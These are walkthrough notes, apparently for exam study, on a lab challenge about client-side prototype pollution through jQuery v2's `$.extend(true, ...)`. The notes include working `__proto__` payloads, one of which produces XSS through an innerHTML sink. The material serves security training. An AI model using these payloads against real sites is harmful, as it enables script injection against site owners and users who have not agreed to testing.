## **Client-Side Prototype Pollution Challenge Walkthrough**

> [!info]  
> **Overview**  
> This walkthrough demonstrates how to detect and exploit **client-side prototype pollution** vulnerabilities in a JavaScript web application using **outdated jQuery (v2.x)**. The challenge focuses on identifying how untrusted user input merges into objects and ultimately reaches a sink for exploitation (e.g., XSS).

---

### **Initial Application Behavior and Recon**

- Refreshing the UI shows some **persistence** (local storage is used).
    
- The settings UI allows toggling preferences.
    

> [!tip]  
> Open browser dev tools (F12) and navigate to `Sources` > `index.html` to analyze JavaScript code.

**Key observations from source analysis:**

- Uses **outdated jQuery v2** (commonly vulnerable to prototype pollution).
    
- `extend()` function is used to merge objects.
    
- The function `applyUserSettingsFromUrl()` retrieves JSON via URL parameters.
    

---

### **Critical Code Snippets to Watch**

```js
const userSettings = JSON.parse(params.settings);
const updatedPreferences = $.extend(true, currentPreferences, userSettings);
```

- **$.extend(true,...)** performs a **deep merge**, enabling prototype pollution if user-controlled.
    
- Input comes from URL param: `?settings=...`
    

> [!important]  
> **Exam Note:**  
> The use of `$.extend(true, ...)` with unsanitized input is a classic client-side prototype pollution vector, especially with jQuery < 3.4.0.

---

### **Input Flow Testing (Step-by-Step)**

#### **Step 1: Trigger the Code Path**

Try a malformed param first:

```plaintext
?settings=test
```

- Triggers JSON parsing error.
    

Then try valid JSON:

```plaintext
?settings={"test":true}
```

- Application successfully loads.
    
- Breakpoints can be used to step through `getQueryParams`, `applyUserSettingsFromUrl`, and `extend()`.
    

#### **Step 2: Prototype Pollution Test**

Test pollution via `__proto__`:

```plaintext
?settings={"__proto__":{"polluted":true}}
```

Check in the console:

```js
console.log({}.polluted); // should output true
```

> [!important]  
> **Exam Reminder:** Prototype pollution can be verified by checking `Object.prototype` or logging `{}` in dev console.

---

### **Finding a Sink to Exploit (e.g., XSS)**

The script updates a message based on preferences:

```js
const message = userPrefs.message || 'Settings updated';
document.getElementById('status').innerHTML = message;
```

Use this to inject XSS via prototype pollution:

```plaintext
?settings={"__proto__":{"message":"<img src=x onerror=prompt(1)>"}}
```

When triggered, the message is inserted into the DOM via `innerHTML`.

> [!danger]  
> **Exam Critical:**  
> This is the **XSS sink** that allows stored XSS via polluted object properties.

---

### **Summary of Exploitation Flow**

1. Outdated jQuery allows deep merging via `$.extend(true, ...)`.
    
2. `settings` URL param passes JSON user input to be merged.
    
3. Passing `__proto__` allows modifying the global prototype.
    
4. Script reads polluted property (`message`) and renders it using `innerHTML`.
    
5. XSS is achieved when HTML is rendered unsanitized.
    

---

### **Key Takeaways & Exam Reminders**

> [!success]  
> **Open-Book Exam Tips:**
> 
> - Watch for `$.extend(true, ...)` patterns in old jQuery code.
>     
> - Verify pollution via `Object.prototype` or `console.log({})`.
>     
> - Always test parameters from `location.search` or URL query strings.
>     
> - Use the `message` sink for XSS when applicable.
>     
> - LocalStorage or prior loads may interfere with testing—clear storage as needed.
>     
